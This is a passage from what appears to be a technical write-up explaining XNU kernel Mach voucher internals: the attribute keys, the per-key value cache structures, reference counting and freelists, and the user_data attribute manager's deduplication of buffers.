 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c7">#define</span><span class="BGLtzooHlW-c4">&nbsp;MACH_VOUCHER_ATTR_KEY_PTHPRIORITY </span><span class="BGLtzooHlW-c2">((</span><span class="BGLtzooHlW-c4">mach_voucher_attr_key_t</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c15">4</span><span class="BGLtzooHlW-c2">)</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c3">&nbsp;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c7">#define</span><span class="BGLtzooHlW-c4">&nbsp;MACH_VOUCHER_ATTR_KEY_USER_DATA </span><span class="BGLtzooHlW-c2">((</span><span class="BGLtzooHlW-c4">mach_voucher_attr_key_t</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c15">7</span><span class="BGLtzooHlW-c2">)</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c3">&nbsp;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c7">#define</span><span class="BGLtzooHlW-c4">&nbsp;MACH_VOUCHER_ATTR_KEY_TEST </span><span class="BGLtzooHlW-c2">((</span><span class="BGLtzooHlW-c4">mach_voucher_attr_key_t</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c15">8</span><span class="BGLtzooHlW-c2">)</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c3">&nbsp;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c7">#define</span><span class="BGLtzooHlW-c4">&nbsp;MACH_VOUCHER_ATTR_KEY_NUM_WELL_KNOWN MACH_VOUCHER_ATTR_KEY_TEST</span></p></td></tr></tbody></table>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>The </span><span class="BGLtzooHlW-c11">iv_inline_table</span><span>&nbsp;in an </span><span class="BGLtzooHlW-c11">ipc_voucher</span><span class="BGLtzooHlW-c10">&nbsp;has 8 entries. But of those, only four are actually supported and have any associated functionality. The ATM voucher attributes are deprecated and the code supporting them is gone so only IMPORTANCE (2), BANK (3), PTHPRIORITY (4) and USER_DATA (7) are valid keys. There&#39;s some confusion (perhaps on my part) about when exactly you should use the term key and when attribute; I&#39;ll use them interchangeably to refer to these key values and the corresponding &quot;types&quot; of values which they manage. More on that later.</span></p><h2 class="BGLtzooHlW-c18 BGLtzooHlW-c5" id="h.z3ifj5rlshxh"><span class="BGLtzooHlW-c20">Values</span></h2>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>Each entry in a voucher </span><span class="BGLtzooHlW-c11">iv_table</span><span>&nbsp;is an </span><span class="BGLtzooHlW-c11">iv_index_t</span><span class="BGLtzooHlW-c10">:</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p><a id="t.adadf70a01ef64fd38d16dcc040ece0a87975524"></a><a id="t.2"></a><table class="BGLtzooHlW-c12"><tbody><tr class="BGLtzooHlW-c1"><td class="BGLtzooHlW-c13" colspan="1" rowspan="1">
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c6">typedef</span><span class="BGLtzooHlW-c4">&nbsp;natural_t iv_index_t</span><span class="BGLtzooHlW-c2">;</span></p></td></tr></tbody></table>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>Each value is again an index; this time into a </span><span class="BGLtzooHlW-c14">per-key</span><span class="BGLtzooHlW-c10">&nbsp;cache of values, abstracted as a &quot;Voucher Attribute Cache Control Object&quot; represented by this structure:</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p><a id="t.34f3e7551949b227b144fa7c23780e56054cf088"></a><a id="t.3"></a><table class="BGLtzooHlW-c12"><tbody><tr class="BGLtzooHlW-c1"><td class="BGLtzooHlW-c13" colspan="1" rowspan="1">
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c6">struct</span><span class="BGLtzooHlW-c4">&nbsp;ipc_voucher_attr_control </span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">os_refcnt_t &nbsp; ivac_refs</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">boolean_t &nbsp; &nbsp; ivac_is_growing</span><span class="BGLtzooHlW-c2">;</span><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c7">/* is the table being grown */</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">ivac_entry_t &nbsp;ivac_table</span><span class="BGLtzooHlW-c2">;</span><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="BGLtzooHlW-c7">/* table of voucher attr value entries */</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">iv_index_t &nbsp; &nbsp;ivac_table_size</span><span class="BGLtzooHlW-c2">;</span><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c7">/* size of the attr value table */</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">iv_index_t &nbsp; &nbsp;ivac_init_table_size</span><span class="BGLtzooHlW-c2">;</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c7">/* size of the attr value table */</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">iv_index_t &nbsp; &nbsp;ivac_freelist</span><span class="BGLtzooHlW-c2">;</span><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c7">/* index of the first free element */</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">ipc_port_t &nbsp; &nbsp;ivac_port</span><span class="BGLtzooHlW-c2">;</span><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c7">/* port for accessing the cache control &nbsp;*/</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">lck_spin_t &nbsp; &nbsp;ivac_lock_data</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">iv_index_t &nbsp; &nbsp;ivac_key_index</span><span class="BGLtzooHlW-c2">;</span><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp;</span><span class="BGLtzooHlW-c7">/* key index for this value */</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c2">};</span></p></td></tr></tbody></table>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c10">These are accessed indirectly via another global table:</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p><a id="t.458710f747bcd533915a3238dbd017b636296741"></a><a id="t.4"></a><table class="BGLtzooHlW-c12"><tbody><tr class="BGLtzooHlW-c1"><td class="BGLtzooHlW-c13" colspan="1" rowspan="1">
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c6">static</span><span class="BGLtzooHlW-c4">&nbsp;ipc_voucher_global_table_element iv_global_table</span><span class="BGLtzooHlW-c2">[</span><span class="BGLtzooHlW-c4">MACH_VOUCHER_ATTR_KEY_NUM_WELL_KNOWN</span><span class="BGLtzooHlW-c2">];</span></p></td></tr></tbody></table>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c10">(Again, the comments in the code indicate that in the future that this table may grow in size and allow attributes to be managed in userspace, but for now it&#39;s just a fixed size array.)</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c10">Each element in that table has this structure:</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p><a id="t.f065f1b068e3aad8a11a5356fab0dbe3d10ab90a"></a><a id="t.5"></a><table class="BGLtzooHlW-c12"><tbody><tr class="BGLtzooHlW-c1"><td class="BGLtzooHlW-c13" colspan="1" rowspan="1">
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c6">typedef</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c6">struct</span><span class="BGLtzooHlW-c4">&nbsp;ipc_voucher_global_table_element </span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; ipc_voucher_attr_manager_t &nbsp; &nbsp; &nbsp;ivgte_manager</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; ipc_voucher_attr_control_t &nbsp; &nbsp; &nbsp;ivgte_control</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; mach_voucher_attr_key_t &nbsp; &nbsp; &nbsp; &nbsp; ivgte_key</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c2">}</span><span class="BGLtzooHlW-c4">&nbsp;ipc_voucher_global_table_element</span><span class="BGLtzooHlW-c2">;</span></p></td></tr></tbody></table>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>Both the </span><span class="BGLtzooHlW-c11">iv_global_table</span><span>&nbsp;and each voucher&#39;s </span><span class="BGLtzooHlW-c11">iv_table</span><span>&nbsp;are indexed by </span><span class="BGLtzooHlW-c11">(key-1)</span><span>, not </span><span class="BGLtzooHlW-c11">key</span><span>, so the userdata entry is </span><span class="BGLtzooHlW-c11">[6]</span><span>, not </span><span class="BGLtzooHlW-c11">[7]</span><span class="BGLtzooHlW-c10">, even though the array still has 8 entries.</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>The </span><span class="BGLtzooHlW-c11">ipc_voucher_attr_control_t</span><span>&nbsp;provides an abstract interface for managing &quot;values&quot; and the </span><span class="BGLtzooHlW-c11">ipc_voucher_attr_manager_t</span><span>&nbsp;provides the &quot;type-specific&quot; logic to implement the semantics of each type (here by type I mean &quot;key&quot; or &quot;attr&quot; type.) Let&#39;s look more concretely at what that means. Here&#39;s the definition of </span><span class="BGLtzooHlW-c11">ipc_voucher_attr_manager_t</span><span class="BGLtzooHlW-c10">:</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p><a id="t.467ea53fdb41a42817b67f1b1b14674c0e55d04b"></a><a id="t.6"></a><table class="BGLtzooHlW-c12"><tbody><tr class="BGLtzooHlW-c1"><td class="BGLtzooHlW-c13" colspan="1" rowspan="1">
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c6">struct</span><span class="BGLtzooHlW-c4">&nbsp;ipc_voucher_attr_manager </span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; ipc_voucher_attr_manager_release_value_t &nbsp; &nbsp;ivam_release_value</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; ipc_voucher_attr_manager_get_value_t &nbsp; &nbsp; &nbsp; &nbsp;ivam_get_value</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; ipc_voucher_attr_manager_extract_content_t &nbsp;ivam_extract_content</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; ipc_voucher_attr_manager_command_t &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ivam_command</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; ipc_voucher_attr_manager_release_t &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ivam_release</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; ipc_voucher_attr_manager_flags &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ivam_flags</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c2">};</span></p></td></tr></tbody></table>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c11">ivam_flags</span><span>&nbsp;is an </span><span class="BGLtzooHlW-c11">int</span><span>&nbsp;containing some flags; the other five fields are function pointers which define the semantics of the particular attr type. Here&#39;s the </span><span class="BGLtzooHlW-c11">ipc_voucher_attr_manager</span><span>&nbsp;structure for the </span><span class="BGLtzooHlW-c11">user_data</span><span class="BGLtzooHlW-c10">&nbsp;type:</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p><a id="t.24cf1225ae06e4faa7d9d726ded665d4facb053f"></a><a id="t.7"></a><table class="BGLtzooHlW-c12"><tbody><tr class="BGLtzooHlW-c1"><td class="BGLtzooHlW-c13" colspan="1" rowspan="1">
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c6">const</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c6">struct</span><span class="BGLtzooHlW-c4">&nbsp;ipc_voucher_attr_manager user_data_manager </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; </span><span class="BGLtzooHlW-c2">.</span><span class="BGLtzooHlW-c4">ivam_release_value </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp; &nbsp;user_data_release_value</span><span class="BGLtzooHlW-c2">,</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; </span><span class="BGLtzooHlW-c2">.</span><span class="BGLtzooHlW-c4">ivam_get_value </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp;user_data_get_value</span><span class="BGLtzooHlW-c2">,</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; </span><span class="BGLtzooHlW-c2">.</span><span class="BGLtzooHlW-c4">ivam_extract_content </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;user_data_extract_content</span><span class="BGLtzooHlW-c2">,</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; </span><span class="BGLtzooHlW-c2">.</span><span class="BGLtzooHlW-c4">ivam_command </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;user_data_command</span><span class="BGLtzooHlW-c2">,</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; </span><span class="BGLtzooHlW-c2">.</span><span class="BGLtzooHlW-c4">ivam_release </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;user_data_release</span><span class="BGLtzooHlW-c2">,</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; </span><span class="BGLtzooHlW-c2">.</span><span class="BGLtzooHlW-c4">ivam_flags </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;IVAM_FLAGS_NONE</span><span class="BGLtzooHlW-c2">,</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c2">};</span></p></td></tr></tbody></table>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c10">Those five function pointers are the only interface from the generic voucher code into the type-specific code. The interface may seem simple but there are some tricky subtleties in there; we&#39;ll get to that later!</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>Let&#39;s go back to the generic </span><span class="BGLtzooHlW-c11">ipc_voucher_attr_control</span><span>&nbsp;structure which maintains the &quot;values&quot; for each key in a type-agnostic way. The most important field is </span><span class="BGLtzooHlW-c11">ivac_entry_t &nbsp;ivac_table</span><span>, which is </span><span>an array of </span><span class="BGLtzooHlW-c11">ivac_entry_s</span><span>&#39;s</span><span>. It&#39;s an index into this table which is stored in each voucher&#39;s </span><span class="BGLtzooHlW-c11">iv_table</span><span class="BGLtzooHlW-c10">.</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c10">Here&#39;s the structure of each entry in that table:</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p><a id="t.777c9f9c4271dfb1023047f7a3639b98f2fed9d2"></a><a id="t.8"></a><table class="BGLtzooHlW-c12"><tbody><tr class="BGLtzooHlW-c1"><td class="BGLtzooHlW-c13" colspan="1" rowspan="1">
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c6">struct</span><span class="BGLtzooHlW-c4">&nbsp;ivac_entry_s </span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; iv_value_handle_t ivace_value</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; iv_value_refs_t &nbsp; ivace_layered</span><span class="BGLtzooHlW-c2">:</span><span class="BGLtzooHlW-c15">1</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp; &nbsp;</span><span class="BGLtzooHlW-c7">/* layered effective entry */</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ivace_releasing</span><span class="BGLtzooHlW-c2">:</span><span class="BGLtzooHlW-c15">1</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c7">/* release in progress */</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ivace_free</span><span class="BGLtzooHlW-c2">:</span><span class="BGLtzooHlW-c15">1</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c7">/* on freelist */</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ivace_persist</span><span class="BGLtzooHlW-c2">:</span><span class="BGLtzooHlW-c15">1</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp; &nbsp;</span><span class="BGLtzooHlW-c7">/* Persist the entry, don&#39;t</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;count made refs */</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ivace_refs</span><span class="BGLtzooHlW-c2">:</span><span class="BGLtzooHlW-c15">28</span><span class="BGLtzooHlW-c2">;</span><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp;</span><span class="BGLtzooHlW-c7">/* reference count */</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; </span><span class="BGLtzooHlW-c6">union</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; iv_value_refs_t ivaceu_made</span><span class="BGLtzooHlW-c2">;</span><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp;</span><span class="BGLtzooHlW-c7">/* made count (non-layered) */</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; iv_index_t &nbsp; &nbsp; &nbsp;ivaceu_layer</span><span class="BGLtzooHlW-c2">;</span><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c7">/* next effective layer</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (layered) */</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; </span><span class="BGLtzooHlW-c2">}</span><span class="BGLtzooHlW-c4">&nbsp;ivace_u</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; iv_index_t &nbsp; &nbsp; &nbsp; &nbsp;ivace_next</span><span class="BGLtzooHlW-c2">;</span><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c7">/* hash or freelist */</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; iv_index_t &nbsp; &nbsp; &nbsp; &nbsp;ivace_index</span><span class="BGLtzooHlW-c2">;</span><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp;</span><span class="BGLtzooHlW-c7">/* hash head (independent) */</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c2">};</span></p></td></tr></tbody></table>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c11">ivace_refs</span><span>&nbsp;is a reference count for this table index. Note that this entry is </span><span class="BGLtzooHlW-c17">inline</span><span>&nbsp;in an array;</span><span>&nbsp;so this reference count going to zero doesn&#39;t cause the </span><span class="BGLtzooHlW-c11">ivac_entry_s</span><span class="BGLtzooHlW-c10">&nbsp;to be free&#39;d back to a kernel allocator (like the zone allocator for example.) Instead, it moves this table index onto a freelist of empty entries. The table can grow but never shrink.</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>Table entries which aren&#39;t free store a type-specific &quot;handle&quot; in </span><span class="BGLtzooHlW-c11">ivace_value</span><span class="BGLtzooHlW-c10">. Here&#39;s the typedef chain for that type:</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p><a id="t.9c51000ec2d891dfe4854f95d2bbcf210598beb6"></a><a id="t.9"></a><table class="BGLtzooHlW-c12"><tbody><tr class="BGLtzooHlW-c1"><td class="BGLtzooHlW-c13" colspan="1" rowspan="1">
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c3">iv_value_handle_t ivace_value</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c6">typedef</span><span class="BGLtzooHlW-c4">&nbsp;mach_voucher_attr_value_handle_t iv_value_handle_t</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c6">typedef</span><span class="BGLtzooHlW-c4">&nbsp;uint64_t mach_voucher_attr_value_handle_t</span><span class="BGLtzooHlW-c2">;</span></p></td></tr></tbody></table>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>The handle is a </span><span class="BGLtzooHlW-c11">uint64_t</span><span class="BGLtzooHlW-c10">&nbsp;but in reality the attrs can (and do) store pointers there, hidden behind casts.</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>A guarantee made by the </span><span class="BGLtzooHlW-c11">attr_control</span><span>&nbsp;is that there will only ever be one (live) </span><span class="BGLtzooHlW-c11">ivac_entr</span><span class="BGLtzooHlW-c11">y_s</span><span>&nbsp;for a particular </span><span class="BGLtzooHlW-c11">ivace_value</span><span>. This means that each time a new </span><span class="BGLtzooHlW-c11">ivace_value</span><span>&nbsp;needs an </span><span class="BGLtzooHlW-c11">ivac_entry</span><span>&nbsp;the </span><span class="BGLtzooHlW-c11">attr_control</span><span>&#39;s </span><span class="BGLtzooHlW-c11">ivac_table</span><span>&nbsp;needs to be searched to see if a matching value is already present. To speed this up in-use </span><span class="BGLtzooHlW-c11">ivac_entries</span><span class="BGLtzooHlW-c10">&nbsp;are linked together in hash buckets so that a (hopefully significantly) shorter linked-list of entries can be searched rather than a linear scan of the whole table. (Note that it&#39;s not a linked-list of pointers; each link in the chain is an index into the table.)</span></p><h2 class="BGLtzooHlW-c5 BGLtzooHlW-c18" id="h.lsgi9jwnyyz4"><span class="BGLtzooHlW-c20">Userdata attrs</span></h2>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c11">user_data</span><span>&nbsp;is one of the four types of supported, implemented voucher attr types. It&#39;s only purpose is to manage buffers of arbitrary, user controlled data. Since the </span><span class="BGLtzooHlW-c11">attr_control</span><span>&nbsp;performs deduping only on the </span><span class="BGLtzooHlW-c11">ivace_value</span><span class="BGLtzooHlW-c10">&nbsp;(which is a pointer) the userdata attr manager is responsible for ensuring that userdata values which have identical buffer values (matching length and bytes) have identical pointers.</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>To do this it maintains a hash table of </span><span class="BGLtzooHlW-c11">user_data_value_element</span><span class="BGLtzooHlW-c10">&nbsp;structures, which wrap a variable-sized buffer of bytes:</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p><a id="t.300b9d1f1ee1dcff9a3ee0de164a2bc6bc43ea65"></a><a id="t.10"></a><table class="BGLtzooHlW-c12"><tbody><tr class="BGLtzooHlW-c1"><td class="BGLtzooHlW-c13" colspan="1" rowspan="1">
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c6">struct</span><span class="BGLtzooHlW-c4">&nbsp;user_data_value_element </span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; mach_voucher_attr_value_reference_t e_made</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; mach_voucher_attr_content_size_t &nbsp; &nbsp;e_size</span><span class="BGLtzooHlW-c2">;</span></p>
